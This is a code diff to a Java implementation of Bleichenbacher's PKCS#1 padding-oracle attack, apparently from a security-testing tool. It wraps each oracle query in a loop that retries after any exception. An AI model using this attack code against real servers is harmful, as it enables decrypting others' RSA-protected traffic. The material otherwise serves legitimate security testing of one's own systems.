@@ -74,7 +74,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         if (this.msgIsPKCS) {
             LOGGER.info("Step skipped --> " + "Message is considered as PKCS compliant.");
             LOGGER.info("Testing the validity of the original message");
-            oracle.checkPKCSConformity(encryptedMsg);
+            saveCheckPKCSConformity(encryptedMsg);
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
             interval = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
@@ -116,7 +116,7 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(ciphered, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
         } while (!pkcsConform);
 
         c0 = new BigInteger(1, send);
@@ -153,7 +153,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      */
     protected void stepTwoA() throws OracleException {
         byte[] send;
-        boolean pkcsConform;
+        boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
         LOGGER.debug("Step 2a: Starting the search");
@@ -173,13 +173,14 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
+
         } while (!pkcsConform);
     }
 
     private void stepTwoB() throws OracleException {
         byte[] send;
-        boolean pkcsConform;
+        boolean pkcsConform = false;
         LOGGER.debug("Step 2b: Searching with more than" + " one interval left");
 
         do {
@@ -187,7 +188,7 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
         } while (!pkcsConform);
     }
 
@@ -228,8 +229,24 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
+
         } while (!pkcsConform);
+    }
+
+    private boolean saveCheckPKCSConformity(byte[] send) {
+        boolean pkcsConform = false;
+        boolean needToRedo = true;
+        while (needToRedo) {
+
+            try {
+                pkcsConform = oracle.checkPKCSConformity(send);
+                needToRedo = false;
+            } catch (Exception e) {
+                LOGGER.warn(e.toString());
+            }
+        }
+        return pkcsConform;
     }
 
     private void stepThree(final int i) {
